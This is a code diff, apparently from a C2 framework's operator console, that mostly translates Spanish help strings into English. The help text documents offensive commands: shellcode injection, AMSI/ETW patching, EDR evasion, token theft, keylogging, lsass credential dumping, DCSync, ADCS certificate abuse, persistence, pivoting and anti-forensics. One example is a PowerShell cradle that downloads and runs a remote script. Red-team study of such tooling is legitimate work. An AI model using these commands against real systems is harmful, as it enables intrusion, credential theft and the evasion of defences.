   <span class="console-section">USO</span>
   inject &lt;pid&gt; &lt;sc.bin&gt;
@@ -10218,12 +10218,12 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   <span class="console-section">TÉCNICA</span>
   1. VirtualAllocEx en el proceso destino
   2. WriteProcessMemory (shellcode)
-  3. CreateRemoteThread → ejecución
+  3. CreateRemoteThread → execution
 
   <span class="console-section">NOTAS</span>
-  • Más ruidoso que inject-apc o thread-hijack
+  • Noisier than inject-apc or thread-hijack
   • Requiere acceso al proceso (SeDebugPrivilege o mismo usuario)
-  • EDRs monitorean VirtualAllocEx+WriteProcessMemory+CreateRemoteThread (secuencia clásica)
+  • EDRs monitor VirtualAllocEx+WriteProcessMemory+CreateRemoteThread (classic sequence)
   • Para mayor sigilo: usar inject-apc (early-bird) o thread-hijack`,
 
   'inject-apc': `<b>inject-apc</b> — APC early-bird en proceso sacrificial nuevo
@@ -10238,15 +10238,15 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
 
   <span class="console-section">TÉCNICA</span>
   1. Crea proceso [proc] suspendido (CREATE_SUSPENDED)
-  2. Mapea sección con shellcode (NtCreateSection/NtMapViewOfSection)
+  2. Maps section with shellcode (NtCreateSection/NtMapViewOfSection)
   3. QueueUserAPC → apunta al shellcode
   4. ResumeThread → el thread ejecuta la APC antes del entry point
 
   <span class="console-section">NOTAS</span>
   • Proceso por defecto: svchost.exe
   • Windows Defender en Server 2022 detecta cross-process APC incluso con exclusiones
-  • Si Defender está activo, usar <b>stage2</b> (in-process) en su lugar
-  • El proceso sacrificial necesita existir en disco con el path estándar`,
+  • If Defender is active, use <b>stage2</b> (in-process) instead
+  • The sacrificial process must exist on disk with the standard path`,
 
   'stage2': `<b>stage2</b> — ejecutar shellcode en el proceso del agente actual (in-process)
 
@@ -10265,7 +10265,7 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
 
   <span class="console-section">DIFERENCIAS vs inject-apc</span>
   • inject-apc spawnea proceso nuevo → detectado por Defender behavioral engine
-  • stage2 es in-process → bypasa detección cross-process de Defender en Server 2022
+  • stage2 is in-process → bypasses Defender cross-process detection on Server 2022
 
   <span class="console-section">NOTAS</span>
   • sc.bin debe estar previamente subido al servidor (upload + nombre del archivo)
@@ -10283,11 +10283,11 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
 
   <span class="console-section">TÉCNICA</span>
   1. Crea proceso sacrificial con PPID spoofado (parece hijo de explorer o lsass)
-  2. Mapea sección RX
+  2. Maps RX section
   3. Parchea RIP del hilo principal → ejecuta shellcode sin CreateRemoteThread
 
   <span class="console-section">NOTAS</span>
-  • Más sigiloso que inject: sin CreateRemoteThread, sin WriteProcessMemory directo
+  • Stealthier than inject: no CreateRemoteThread, no direct WriteProcessMemory
   • Combina PPID spoofing + thread hijack para reducir IOCs`,
 
   'thread-hijack': `<b>thread-hijack</b> — section map + parchear RIP de thread existente
@@ -10300,16 +10300,16 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
 
   <span class="console-section">TÉCNICA</span>
   1. Abre proceso existente
-  2. Mapea sección con shellcode (NtCreateSection/NtMapViewOfSection)
+  2. Maps section with shellcode (NtCreateSection/NtMapViewOfSection)
   3. Suspende un thread del proceso
   4. GetThreadContext → modifica RIP → SetThreadContext → ResumeThread
 
   <span class="console-section">NOTAS</span>
-  • Sin CreateRemoteThread → evita ese IOC específico
-  • El proceso sigue ejecutándose (thread hijack temporal)
+  • No CreateRemoteThread → avoids that specific IOC
+  • The process keeps running (temporary thread hijack)
   • Requiere acceso al proceso con THREAD_SET_CONTEXT`,
 
-  'dotnet-asm': `<b>dotnet-asm</b> — ejecutar assembly .NET vía Donut en proceso sacrificial
+  'dotnet-asm': `<b>dotnet-asm</b> — run .NET assembly via Donut in sacrificial process
 
   <span class="console-section">USO</span>
   dotnet-asm &lt;assembly.exe&gt; [proceso_sacrificial]
@@ -10321,13 +10321,13 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
 
   <span class="console-section">TÉCNICA</span>
   1. El servidor convierte el .NET EXE a shellcode con Donut
-  2. El shellcode se inyecta en [proc] sacrificial vía APC early-bird
+  2. Shellcode is injected into sacrificial [proc] via early-bird APC
   3. El .NET corre dentro del proceso sacrificial — sin CLR visible en el agente
 
   <span class="console-section">NOTAS</span>
   • Requiere Donut instalado en el servidor (~/.local/bin/donut)
   • Sin proceso especificado, usa svchost.exe
-  • Si Defender detecta el proceso, probar clrstomp para ejecución in-process`,
+  • If Defender detects the process, try clrstomp for in-process execution`,
 
   'dotnet-exec': `<b>dotnet-exec</b> — CLR inline-execute en-proceso (Rubeus, Seatbelt, SharpHound…)
 
@@ -10341,14 +10341,14 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   dotnet-exec hellonet.exe
 
   <span class="console-section">TÉCNICA</span>
-  • CLR nativo en-proceso vía ICorRuntimeHost + AppDomain.Load_3 (sin Donut, sin proceso sacrificial)
+  • Native in-process CLR via ICorRuntimeHost + AppDomain.Load_3 (no Donut, no sacrificial process)
   • Captura Console.Write/WriteLine mediante DirectWriter P/Invoke (WriteFile directo, sin buffering)
   • AMSI y ETW parcheados antes de cargar el assembly
-  • SharpHound puede tardar hasta 15 minutos; el resto usa un límite de 60 s
+  • SharpHound can take up to 15 minutes; others use a 60s timeout
 
   <span class="console-section">DIFERENCIAS vs dotnet-asm / clrstomp</span>
   dotnet-asm  → Donut + proceso sacrificial nuevo (CLR invisible en el agente)
-  clrstomp    → CLR vía GAC legítimo + stomping de memoria
+  clrstomp    → CLR via legitimate GAC + memory stomping
   dotnet-exec → CLR directo en el agente, salida capturada completa
 
   <span class="console-section">NOTAS</span>
@@ -10356,7 +10356,7 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   • Sin proceso nuevo — el agente sigue vivo si el assembly cuelga (timeout acotado)
   • Equivalente a: Cobalt Strike execute-assembly / Havoc dotnet inline-execute`,
 
-  'clrstomp': `<b>clrstomp</b> — .NET in-process vía CLR stomping (sin Donut, sin proceso nuevo)
+  'clrstomp': `<b>clrstomp</b> — .NET in-process via CLR stomping (no Donut, no new process)
 
   <span class="console-section">USO</span>
   clrstomp &lt;assembly.exe&gt; [args_para_el_assembly]
@@ -10367,19 +10367,19 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   clrstomp Rubeus.exe dump /service:krbtgt
 
   <span class="console-section">TÉCNICA</span>
-  1. Carga un .NET assembly legítimo del GAC (e.g. Microsoft.Build.dll)
-  2. Trae el CLR al proceso actual por vía legítima
-  3. Sobreescribe la memoria del assembly legítimo con el assembly malicioso
+  1. Loads a legitimate .NET assembly from the GAC (e.g. Microsoft.Build.dll)
+  2. Brings the CLR into the current process via a legitimate path
+  3. Overwrites the legitimate assembly memory with the malicious assembly
   4. Ejecuta el assembly malicioso dentro del mismo proceso
 
   <span class="console-section">DIFERENCIAS vs dotnet-asm</span>
   • Sin Donut — no convierte a shellcode
   • Sin proceso nuevo — corre en el proceso del agente
-  • El header del assembly legítimo del GAC permanece en memoria (cobertura)
+  • The legitimate GAC assembly header stays in memory (cover)
 
   <span class="console-section">NOTAS</span>
-  • Requiere que el .NET assembly esté subido al servidor
-  • Más sigiloso para ejecución de herramientas .NET ofensivas`,
+  • Requires the .NET assembly to be uploaded to the server
+  • Stealthier for running offensive .NET tools`,
 
   'bof': `<b>bof</b> — ejecutar Beacon Object File (COFF x64)
 
@@ -10414,7 +10414,7 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
 
   <span class="console-section">NOTAS</span>
   • Detecta inline hooks de EDRs que interceptan syscalls
-  • Útil para saber qué funciones están monitoreadas antes de ejecutar técnicas
+  • Useful to know which functions are monitored before executing techniques
   • Para bypassear: usar syscalls directas (direct syscall) o unhooking`,
 
   'hw-bp-check': `<b>hw-bp-check</b> — detectar hardware breakpoints activos
@@ -10427,10 +10427,10 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
 
   <span class="console-section">NOTAS</span>
   • Los EDRs avanzados (CrowdStrike, SentinelOne) pueden usar HW BPs para callbacks
-  • Si DR0–DR3 tienen direcciones distintas de 0, hay instrumentación activa
+  • If DR0–DR3 have addresses other than 0, active instrumentation is present
   • Solo aplica al thread actual del agente`,
 
-  'mem-fluctuate': `<b>mem-fluctuate</b> — mutar buffers internos periódicamente contra escaneos de memoria
+  'mem-fluctuate': `<b>mem-fluctuate</b> — periodically mutate internal buffers against memory scans
 
   <span class="console-section">USO</span>
   mem-fluctuate start [intervalo_segundos]
@@ -10442,8 +10442,8 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   mem-fluctuate stop
 
   <span class="console-section">NOTAS</span>
-  • XOR-cifra periódicamente el shellcode/DLL reflectivo en memoria
-  • Reduce la ventana de detección de escaneos periódicos de EDRs
+  • Periodically XOR-encrypts the shellcode/reflective DLL in memory
+  • Reduces the detection window from periodic EDR memory scans
   • Los buffers se descifran antes de cada uso y se vuelven a cifrar`,
 
   'encode-uuid': `<b>encode-uuid</b> — codificar shellcode como array de UUIDs
@@ -10455,34 +10455,34 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   encode-uuid agent.bin
 
   <span class="console-section">SALIDA</span>
-  Código C listo para compilar que decodifica el shellcode vía UuidFromStringA
+  Ready-to-compile C code that decodes shellcode via UuidFromStringA
 
   <span class="console-section">TÉCNICA</span>
   • Cada 16 bytes de shellcode = 1 UUID string
   • UuidFromStringA (Rpcrt4.dll) convierte UUID → bytes → ejecuta en memoria
-  • Sin llamadas directas a memcpy ni WinAPI de inyección obvias en el código fuente
+  • No direct memcpy or obvious injection WinAPI calls in the source code
 
   <span class="console-section">NOTAS</span>
-  • Útil para evadir detección estática de shellcode en código fuente
-  • Combinar con cifrado adicional para mayor evasión`,
+  • Useful for evading static shellcode detection in source code
+  • Combine with additional encryption for greater evasion`,
 
-  'token': `<b>token</b> — gestión de tokens de acceso de Windows
+  'token': `<b>token</b> — Windows access token management
 
   <span class="console-section">USO</span>
   token whoami
   token steal &lt;pid&gt;
-  token make &lt;usuario&gt; &lt;contraseña&gt;
+  token make &lt;user&gt; &lt;password&gt;
   token drop
 
   <span class="console-section">EJEMPLOS</span>
   token whoami               → ver token actual (usuario, grupos, privilegios)
   token steal 664            → impersonar el token del proceso 664 (ej: lsass → SYSTEM)
-  token make corp\\\\admin P@ss  → crear token de logon (sin contraseña en red)
+  token make corp\\\\admin P@ss  → create logon token (no password on network)
   token drop                 → revertir al token original del proceso
 
   <span class="console-section">NOTAS</span>
   • steal requiere SeDebugPrivilege (o ser SYSTEM)
-  • make usa LogonUser → útil para moverse lateralmente con credenciales conocidas
+  • make uses LogonUser → useful for lateral movement with known credentials
   • drop equivale a RevertToSelf`,
 
   'steal-token': `<b>steal-token</b> — impersonar token de un proceso
@@ -10501,14 +10501,14 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   'make-token': `<b>make-token</b> — crear token de logon con credenciales (Rust agent)
 
   <span class="console-section">USO</span>
-  make-token &lt;dominio\\\\usuario&gt; &lt;contraseña&gt;
+  make-token &lt;domain\\\\user&gt; &lt;password&gt;
 
   <span class="console-section">EJEMPLOS</span>
   make-token CORP\\\\administrator P@ssw0rd
   make-token .\\\\localadmin Password123
 
   <span class="console-section">NOTAS</span>
-  • Crea token de tipo LOGON32_LOGON_NEW_CREDENTIALS (no valida en local, sí en red)
+  • Creates LOGON32_LOGON_NEW_CREDENTIALS token (not validated locally, yes on network)
   • Útil para movimiento lateral con credenciales conocidas sin cambiar el contexto local`,
 
   'rev2self': `<b>rev2self</b> — revertir al token original del proceso
@@ -10533,8 +10533,8 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   keylog stop       → desinstalar hook y limpiar buffer
 
   <span class="console-section">NOTAS</span>
-  • WH_KEYBOARD_LL captura pulsaciones globales incluyendo contraseñas
-  • El hook opera a nivel de mensaje de Windows, no necesita inyección en otros procesos
+  • WH_KEYBOARD_LL captures global keystrokes including passwords
+  • The hook operates at the Windows message level, no injection in other processes needed
   • dump se puede llamar varias veces sin detener el keylogger`,
 
   'clip': `<b>clip</b> — leer el contenido del portapapeles
@@ -10544,7 +10544,7 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
 
   <span class="console-section">NOTAS</span>
   • Solo texto plano (GetClipboardData CF_TEXT)
-  • Útil para capturar contraseñas copiadas, tokens, etc.`,
+  • Useful for capturing typed passwords, tokens, etc.`,
 
   'minidump': `<b>minidump</b> — volcar proceso a archivo .dmp y descargarlo
 
@@ -10552,32 +10552,32 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   minidump [pid]
 
   <span class="console-section">EJEMPLOS</span>
-  minidump           → volcar lsass.exe (pid automático)
+  minidump           → dump lsass.exe (automatic pid)
   minidump 664       → volcar proceso con PID 664
 
   <span class="console-section">NOTAS</span>
-  • Sin pid, busca lsass.exe automáticamente → dump de credenciales en memoria
-  • El .dmp se descarga al servidor y aparece en la pestaña Files
+  • Without pid, finds lsass.exe automatically → in-memory credential dump
+  • The .dmp is downloaded to the server and appears in the Files tab
   • Analizar offline con: pypykatz lsa minidump lsass.dmp
-  • EDRs detectan MiniDumpWriteDump directo → usar lsass-dump-nt para evasión`,
+  • EDRs detect direct MiniDumpWriteDump → use lsass-dump-nt for evasion`,
 
-  'lsass-dump-nt': `<b>lsass-dump-nt</b> — volcar lsass con NtReadVirtualMemory (evasión EDR)
+  'lsass-dump-nt': `<b>lsass-dump-nt</b> — dump lsass with NtReadVirtualMemory (EDR evasion)
 
   <span class="console-section">USO</span>
   lsass-dump-nt [pid]
 
   <span class="console-section">EJEMPLOS</span>
-  lsass-dump-nt          → pid de lsass automático
-  lsass-dump-nt 664      → PID explícito
+  lsass-dump-nt          → lsass pid automatic
+  lsass-dump-nt 664      → explicit PID
 
   <span class="console-section">DIFERENCIA CON MINIDUMP</span>
   • No llama a MiniDumpWriteDump (API monitoreada por EDRs)
-  • Usa NtReadVirtualMemory directamente vía GetProcAddress
+  • Uses NtReadVirtualMemory directly via GetProcAddress
   • Construye el MDMP manualmente (SystemInfo + ModuleList + Memory64List)
   • El .dmp se descarga y analiza igual: pypykatz lsa minidump lsass_nt.dmp
   • Requiere SeDebugPrivilege (SYSTEM o admin con debug)`,
 
-  'adcs-request': `<b>adcs-request</b> — solicitar certificado ADCS vía certreq.exe (ESC1-6)
+  'adcs-request': `<b>adcs-request</b> — request ADCS certificate via certreq.exe (ESC1-6)
 
   <span class="console-section">USO</span>
   adcs-request &lt;ca&gt; &lt;template&gt; &lt;subject&gt; [san=upn@domain] [out=C:\\path\\cert.pfx]
@@ -10588,11 +10588,11 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
 
   <span class="console-section">NOTAS</span>
   • ESC1: template permite SAN arbitrario → san=administrator@domain para impersonar DA
-  • ESC3/ESC4: explotar permisos débiles en enrollment agents y template ACLs
+  • ESC3/ESC4: exploit weak permissions in enrollment agents and template ACLs
   • El cert se descarga como base64 y aparece en Files; usar con Rubeus o certipy
-  • Requiere que certreq.exe esté disponible (Windows Server/Client estándar)`,
+  • Requires certreq.exe to be available (standard Windows Server/Client)`,
 
-  'bof-list': `<b>bof-list</b> — información sobre tipos de argumentos BOF
+  'bof-list': `<b>bof-list</b> — information about BOF argument types
 
   <span class="console-section">USO</span>
   bof-list
@@ -10608,8 +10608,8 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   dcsync [ifm|vss] [out=C:\\ruta]
 
   <span class="console-section">MODOS</span>
-  ifm (default)   ntdsutil "create full" — más sigiloso, sin VSS
-  vss             vssadmin shadow copy — funciona si ntdsutil no está
+  ifm (default)   ntdsutil "create full" — stealthier, no VSS
+  vss             vssadmin shadow copy — works if ntdsutil is unavailable
 
   <span class="console-section">EJEMPLOS</span>
   dcsync
@@ -10621,10 +10621,10 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
 
   <span class="console-section">NOTAS</span>
   • Requiere DA o SeBackupPrivilege (ejecutar desde DC o con acceso admin al DC)
-  • Los archivos ntds.dit y SYSTEM aparecen en la pestaña Files del agente
+  • The ntds.dit and SYSTEM files appear in the agent's Files tab
   • Alternativa ligera: ntds-dump (solo ejecuta ntdsutil, no sube archivos)`,
 
-  'ads': `<b>ads</b> — gestión de Alternate Data Streams NTFS
+  'ads': `<b>ads</b> — Alternate Data Streams NTFS management
 
   <span class="console-section">USO</span>
   ads list &lt;archivo&gt;
@@ -10639,9 +10639,9 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   ads del C:\\test.txt:hidden
 
   <span class="console-section">NOTAS</span>
-  • Los streams ADS no aparecen en dir ni Explorer estándar
+  • ADS streams do not appear in dir or standard Explorer
   • Útil para ocultar payloads, notas o credenciales en archivos inocentes
-  • Herramienta de análisis: streams.exe (Sysinternals)`,
+  • Analysis tool: streams.exe (Sysinternals)`,
 
   'wipe-mz': `<b>wipe-mz</b> — borrar cabecera MZ/PE del agente en memoria
 
@@ -10651,19 +10651,19 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   <span class="console-section">NOTAS</span>
   • Sobreescribe los primeros bytes del PE cargado en memoria (MZ, cabeceras PE)
   • Impide que herramientas de volcado de memoria reconstruyan el ejecutable
-  • Anti-forensics: el proceso sigue corriendo pero sin firma PE válida en RAM
+  • Anti-forensics: the process keeps running but without a valid PE signature in RAM
   • Hacer siempre tras comprometer un host sensible`,
 
   'port-scan': `<b>port-scan</b> — host discovery y TCP port scan desde el agente
 
   <span class="console-section">USO</span>
-  port-scan &lt;objetivo&gt; [puertos|método] [timeout_ms]
+  port-scan &lt;target&gt; [ports|method] [timeout_ms]
   Sin puertos → host discovery (auto: ARP→ICMP→TCP)
 
   <span class="console-section">FORMATOS DE OBJETIVO</span>
   192.168.1.1                 IP individual
   192.168.1.0/24              CIDR — toda la subred
-  192.168.1.1-20              rango último octeto
+  192.168.1.1-20              last-octet range
   192.168.1.1-192.168.1.50   rango IP completo
   dc01.corp.local             hostname
 
@@ -10688,7 +10688,7 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   <span class="console-section">NOTAS</span>
   • Escaneo desde la red del agente (pivoting de reconocimiento)
   • ARP solo funciona en la misma subred L2
-  • Concurrencia máx 512 goroutines`,
+  • Max concurrency 512 goroutines`,
 
   'persist': `<b>persist</b> — establecer persistencia en el sistema
 
@@ -10698,24 +10698,24 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   persist rm                   → eliminar persistencia activa
 
   <span class="console-section">EJEMPLOS</span>
-  persist run-key              → agente se ejecuta al iniciar sesión
+  persist run-key              → agent runs at login
   persist task WindowsUpdate   → tarea "WindowsUpdate" ejecuta el agente
   persist rm                   → elimina la persistencia establecida
 
   <span class="console-section">NOTAS</span>
   • run-key escribe en HKCU (sin privilegios de admin)
-  • persist task requiere que el agente esté en disco con path accesible
+  • persist task requires the agent to be on disk with an accessible path
   • Go/Nim agent; en Linux usa systemd o cron`,
 
   'socks': `<b>socks</b> — iniciar proxy SOCKS5 en el agente (Go agent)
 
   <span class="console-section">USO</span>
-  socks &lt;puerto&gt; [usuario:contraseña]
+  socks &lt;port&gt; [user:password]
   socks stop
 
   <span class="console-section">EJEMPLOS</span>
   socks 1080                  → SOCKS5 sin auth en puerto 1080 del agente
-  socks 1080 admin:secret     → SOCKS5 con autenticación RFC 1929
+  socks 1080 admin:secret     → SOCKS5 with RFC 1929 authentication
   socks stop                  → cerrar proxy
 
   <span class="console-section">USO CON PROXYCHAINS</span>
@@ -10724,7 +10724,7 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
 
   <span class="console-section">NOTAS</span>
   • El proxy escucha en la IP del agente, no en el C2
-  • Requiere acceso directo al puerto del agente desde Kali (o usar rsocks si detrás de NAT)`,
+  • Requires direct access to agent port from Kali (or use rsocks if behind NAT)`,
 
   'socks5': `<b>socks5</b> — alias de <b>socks</b>; iniciar proxy SOCKS5 en el agente
 
@@ -10745,7 +10745,7 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   'rsocks': `<b>rsocks</b> — reverse SOCKS5: el agente conecta al C2 (bypasa NAT/firewall)
 
   <span class="console-section">USO</span>
-  rsocks start [puerto] [usuario:contraseña]
+  rsocks start [port] [user:password]
   rsocks stop
 
   <span class="console-section">EJEMPLOS</span>
@@ -10755,16 +10755,16 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
 
   <span class="console-section">CÓMO FUNCIONA</span>
   1. El C2 abre un listener en &lt;puerto&gt;
-  2. El agente conecta al C2 y establece un túnel inverso
+  2. The agent connects to C2 and establishes a reverse tunnel
   3. Las conexiones SOCKS5 a &lt;ip_C2&gt;:&lt;puerto&gt; se tunelean por el agente
 
   <span class="console-section">USO CON PROXYCHAINS</span>
   socks5 &lt;ip_C2&gt; 1080 op s3cret
 
   <span class="console-section">NOTAS</span>
-  • Ideal cuando el agente está en red sin puertos abiertos entrantes`,
+  • Ideal when the agent is on a network with no open inbound ports`,
 
-  'portfwd': `<b>portfwd</b> — reenvío de puerto: lport del agente → rhost:rport
+  'portfwd': `<b>portfwd</b> — port forward: agent lport → rhost:rport
 
   <span class="console-section">USO</span>
   portfwd add [tcp|udp] &lt;lport&gt; &lt;rhost&gt; &lt;rport&gt;
@@ -10774,7 +10774,7 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   <span class="console-section">EJEMPLOS</span>
   portfwd add tcp 4444 10.10.10.20 3389    → RDP al host interno desde Kali via agente
   portfwd add tcp 8080 192.168.1.5 80      → HTTP interno expuesto en agente:8080
-  portfwd add udp 53 10.10.10.1 53         → reenvío DNS
+  portfwd add udp 53 10.10.10.1 53         → DNS forward
   portfwd del tcp 4444
   portfwd list
 
@@ -10783,7 +10783,7 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   rdesktop &lt;ip_agente&gt;:4444
   xfreerdp /v:&lt;ip_agente&gt;:4444`,
 
-  'httpivot': `<b>httpivot</b> — servidor HTTP en el agente que enruta tráfico a su red interna
+  'httpivot': `<b>httpivot</b> — HTTP server on the agent that routes traffic to its internal network
 
   <span class="console-section">USO</span>
   httpivot start [puerto]
@@ -10798,7 +10798,7 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   http &lt;ip_agente&gt; 8118
 
   <span class="console-section">NOTAS</span>
-  • El agente actúa como proxy HTTP CONNECT hacia su red interna
+  • The agent acts as an HTTP CONNECT proxy to its internal network
   • Permite alcanzar hosts que el agente puede ver pero el C2 no`,
 
   'tcppivot': `<b>tcppivot</b> — escucha TCP en el agente; agentes hijo se conectan con Transport=tcp (P2P cross-platform)
@@ -10815,14 +10815,14 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   <span class="console-section">CÓMO FUNCIONA</span>
   1. El agente padre escucha en TCP :&lt;puerto&gt;
   2. El agente hijo usa Transport=tcp apuntando a &lt;ip_padre&gt;:&lt;puerto&gt;
-  3. El padre reenvía el tráfico C2 del hijo hacia el C2 real
+  3. The parent forwards the child's C2 traffic to the real C2
   4. Soporta cadenas N-hop (hijo → padre TCP pivot → C2)
 
   <span class="console-section">NOTAS</span>
   • Cross-platform: funciona en Linux, Mac y Windows (a diferencia de SMB)
   • El hijo no necesita acceso al C2 directamente`,
 
-  'link': `<b>link</b> — conectar agente hijo vía named pipe SMB (P2P)
+  'link': `<b>link</b> — connect child agent via SMB named pipe (P2P)
 
   <span class="console-section">USO</span>
   link start [pipename]
@@ -10835,18 +10835,18 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
 
   <span class="console-section">CÓMO FUNCIONA</span>
   1. El agente hijo (pipe server) escucha en \\\\.\\pipe\\&lt;pipename&gt;
-  2. El agente padre conecta vía link start
-  3. El tráfico C2 del agente hijo fluye por el named pipe del padre
+  2. The parent agent connects via link start
+  3. The child agent's C2 traffic flows through the parent's named pipe
 
   <span class="console-section">NOTAS</span>
   • Útil para agentes en hosts sin acceso a internet (solo SMB 445)
-  • El tráfico SMB es común → menos sospechoso en redes corporativas`,
+  • SMB traffic is common → less suspicious on corporate networks`,
 
-  'winrm': `<b>winrm</b> — ejecución/despliegue en host remoto vía WinRM
+  'winrm': `<b>winrm</b> — execution/deployment on remote host via WinRM
 
   <span class="console-section">USO</span>
-  winrm exec &lt;target&gt; &lt;usuario&gt; &lt;contraseña&gt; &lt;comando&gt;
-  winrm deploy &lt;target&gt; &lt;usuario&gt; &lt;contraseña&gt; &lt;cradle_ps&gt;
+  winrm exec &lt;target&gt; &lt;user&gt; &lt;password&gt; &lt;command&gt;
+  winrm deploy &lt;target&gt; &lt;user&gt; &lt;password&gt; &lt;cradle_ps&gt;
 
   <span class="console-section">EJEMPLOS</span>
   winrm exec 10.10.10.5 administrator P@ss whoami
@@ -10854,21 +10854,21 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   winrm deploy 10.10.10.5 administrator P@ss "IEX(New-Object Net.WebClient).DownloadString('http://10.2.10.1/a.ps1')"
 
   <span class="console-section">NOTAS</span>
-  • Puerto 5985 (HTTP) — asegurarse que WinRM está habilitado en el destino
+  • Port 5985 (HTTP) — ensure WinRM is enabled on the target
   • Para habilitar en el destino: Enable-PSRemoting -Force
   • deploy ejecuta el cradle PowerShell para desplegar un nuevo agente`,
 
-  'ishell': `<b>ishell</b> — shell interactiva persistente
+  'ishell': `<b>ishell</b> — persistent interactive shell
 
   <span class="console-section">USO</span>
   ishell cmd      → abrir cmd.exe interactivo
   ishell ps       → abrir PowerShell interactivo
-  ishell exit     → cerrar shell interactiva
+  ishell exit     → close interactive shell
 
   <span class="console-section">NOTAS</span>
   • El estado del directorio y variables de entorno persiste entre comandos
   • Útil para sesiones largas sin tener que prefijar "shell" cada vez
-  • Usa shell interactiva para comandos encadenados: cd C:\\Temp &amp;&amp; dir
+  • Use interactive shell for chained commands: cd C:\\Temp &amp;&amp; dir
   • ishell exit cierra la shell y vuelve al modo normal del agente`,
 
   'cleanup': `<b>cleanup</b> — auto-eliminar el agente del sistema
@@ -10879,8 +10879,8 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   <span class="console-section">NOTAS</span>
   • Elimina el ejecutable del agente del disco
   • Elimina entradas de persistencia (si existen)
-  • El agente termina después de limpiar
-  • Acción irreversible — confirmar antes de usar`,
+  • The agent exits after cleanup
+  • Irreversible action — confirm before use`,
 
   'kill': `<b>kill</b> — terminar el proceso del agente
 
@@ -10898,7 +10898,7 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   getpid
 
   <span class="console-section">NOTAS</span>
-  • Útil para identificar el proceso en ps y evitar inyectarlo sobre sí mismo`,
+  • Useful to identify the process in ps and avoid injecting into itself`,
 
   'ppid': `<b>ppid</b> — mostrar el PPID del proceso padre del agente
 
@@ -10906,8 +10906,8 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   ppid
 
   <span class="console-section">NOTAS</span>
-  • Muestra de qué proceso es hijo el agente
-  • Útil para entender el árbol de procesos y el contexto de ejecución`,
+  • Shows which process is the parent of the agent
+  • Useful to understand the process tree and execution context`,
 
   'pwd': `<b>pwd</b> — mostrar el directorio de trabajo actual
 
@@ -10969,7 +10969,7 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   mv &lt;origen&gt; &lt;destino&gt;`,
   'grep': `<b>grep</b> — buscar texto recursivamente
   <span class="console-section">USO</span>
-  grep &lt;patrón&gt; &lt;ruta&gt;`,
+  grep &lt;pattern&gt; &lt;path&gt;`,
   'mount': `<b>mount</b> — listar puntos de montaje
   <span class="console-section">USO</span>
   mount`,
@@ -10979,7 +10979,7 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   'chown': `<b>chown</b> — cambiar propietario POSIX
   <span class="console-section">USO</span>
   chown &lt;usuario[:grupo]&gt; &lt;ruta&gt;`,
-  'chtimes': `<b>chtimes</b> — cambiar fecha de modificación
+  'chtimes': `<b>chtimes</b> — change modification date
   <span class="console-section">USO</span>
   chtimes &lt;RFC3339&gt; &lt;ruta&gt;`,
 
@@ -10998,9 +10998,9 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   results [n]
 
   <span class="console-section">EJEMPLOS</span>
-  results         → últimos 20 resultados
-  results 5       → últimos 5 resultados
-  results 100     → últimos 100 resultados`,
+  results         → last 20 results
+  results 5       → last 5 results
+  results 100     → last 100 results`,
 
   'tasks': `<b>tasks</b> — ver cola de tareas del agente
 
@@ -11008,21 +11008,21 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   tasks [n]
 
   <span class="console-section">EJEMPLOS</span>
-  tasks           → últimas 20 tareas (pending + fetched + done)
-  tasks 50        → últimas 50 tareas
+  tasks           → last 20 tasks (pending + fetched + done)
+  tasks 50        → last 50 tasks
 
   <span class="console-section">NOTAS</span>
   • Muestra ID, estado, tipo y argumentos de cada tarea
   • Estado: pending = en cola · fetched = recogida por el agente · done = completada`,
 
-  'back': `<b>back</b> — cerrar la consola del agente
